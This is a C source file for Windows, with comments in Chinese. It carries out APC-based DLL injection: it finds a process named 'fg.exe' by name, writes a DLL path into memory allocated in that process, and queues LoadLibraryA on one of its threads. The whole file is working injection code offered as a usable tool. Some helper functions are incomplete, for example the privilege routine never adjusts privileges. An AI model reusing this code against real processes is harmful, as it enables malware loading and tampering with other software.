#include "header.h"

BOOL EnableDebugPrivilege() {
	HANDLE TokenHandle = NULL;
	TOKEN_PRIVILEGES TokenPrivilege;
	LUID uid;
	//打开权限令牌
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle)) {
		printf("[-] Failed to OpenProcessToken. Error: %d\n", GetLastError());
		return false;
	}
	CloseHandle(TokenHandle);
}

DWORD GetProcessIdByName(LPCTSTR lpszProcessName){
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE){
		return 0;
	}
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof pe;
	if (Process32First(hSnapshot, &pe)){
		do {
			if (lstrcmpi(lpszProcessName, pe.szExeFile) == 0)
			{
				CloseHandle(hSnapshot);
				return pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}
	CloseHandle(hSnapshot);
	return 0;
}

BOOL GetAllThreadIdByProcessId(DWORD dwProcessId){
	DWORD dwBufferLength = 1000;
	THREADENTRY32 te32 = { 0 };
	HANDLE hSnapshot = NULL;
	BOOL bRet = TRUE;
	// 获取线程快照
	RtlZeroMemory(&te32, sizeof(te32));
	te32.dwSize = sizeof(te32);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	// 获取第一条线程快照信息
	bRet = Thread32First(hSnapshot, &te32);
	while (bRet){
		// 获取进程对应的线程ID
		if (te32.th32OwnerProcessID == dwProcessId){
			return te32.th32ThreadID;
		}
		// 遍历下一个线程快照信息
		bRet = Thread32Next(hSnapshot, &te32);
	}
	return 0;
}
int main(int argc, char* argv) {
	FARPROC pLoadLibrary = NULL;
	HANDLE hThread = NULL;
	HANDLE hProcess = 0;
	DWORD dwTID = 0;
	DWORD dwPID = 0;
	//BYTE dllname[] = "C:\\users\\hack\\desktop\\test\\Dll.dll";
	BYTE dllname[] = "C:\\users\\administrator\\desktop\\Dll.dll";
	LPVOID lpAddr = NULL;
	dwPID = GetProcessIdByName((LPCTSTR)"fg.exe");
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwPID);
	if (hProcess == NULL) {
		printf("[-] Failed to OpenProcess. Error: %d", GetLastError());
		return -1;
	}
	pLoadLibrary = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (pLoadLibrary == NULL) {
		printf("[-] Failed to GetProcAddress. Error: %d", GetLastError());
		return -1;
	}
	lpAddr = VirtualAllocEx(hProcess, 0, sizeof(dllname) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpAddr == NULL) {
		printf("[-] Failed to VirtualAllocEx. Error: %d", GetLastError());
		return -1;
	}
	//将dll的路径名复制到分配的内存中
	if (!WriteProcessMemory(hProcess, lpAddr, dllname, sizeof(dllname) + 1, NULL)) {
		printf("[-]Failed to WriteProcessMemory. Error: %d", GetLastError());
		return -1;
	}
	
	dwTID = GetAllThreadIdByProcessId(dwPID);
	hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, dwTID);
	if (hThread == NULL) {
		printf("[-] Failed to OpenThread. Error: %d", GetLastError());
		return -1;
	}
	QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)lpAddr);
	printf("[+] Inject successfully.\n");
	CloseHandle(hProcess);
	CloseHandle(hThread);
	return 0;
}